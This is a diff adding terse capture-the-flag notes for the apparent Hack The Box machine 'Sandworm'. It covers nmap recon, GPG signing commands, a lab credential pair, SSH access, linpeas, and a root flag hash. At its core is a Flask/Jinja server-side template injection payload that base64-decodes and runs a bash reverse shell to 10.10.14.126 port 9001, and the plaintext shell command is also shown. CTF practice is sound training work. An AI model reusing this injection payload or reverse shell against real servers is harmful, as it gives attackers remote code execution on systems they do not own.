@@ -1,0 +1,37 @@
+nmap -sC -sV 10.10.11.218 -oN sandworm.nmap
+https://ssa.htb
+
+sudo nano /etc/hosts
+10.10.11.218 ssa.htb
+
+GPG (GNU PRIVACY GUARD)
+
+gpg --gen-key
+gpg --armor --export testing@htb > public_key.asc
+gpg --list-keys
+gpg --clear-sign --output signed_message.asc message.txt
+
+gpg --delete-secret-keys testing@htb
+gpg --delete-keys testing@htb
+
+flask jinja
+{{ request.application.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvOTAwMSAwPiYxJwo=" | base64 -d | bash').read() }}
+
+
+echo "bash -c 'bash -i >& /dev/tcp/10.10.14.126/9001 0>&1'" | base64
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvOTAwMSAwPiYxJwo=
+
+
+SSTI (SERVER SIDE TEMPLATE INJECTION)
+
+silentobserver : quietLiketheWind22
+
+my ip = 10.10.14.126
+
+ssh -i ./id_rsa atlas@ssa.htb
+linpeas.sh
+
+atlas@sandworm:~$ ps aux | grep firejail
+
+
+root.txt = b55e86b849889b421793cc3964b2724c
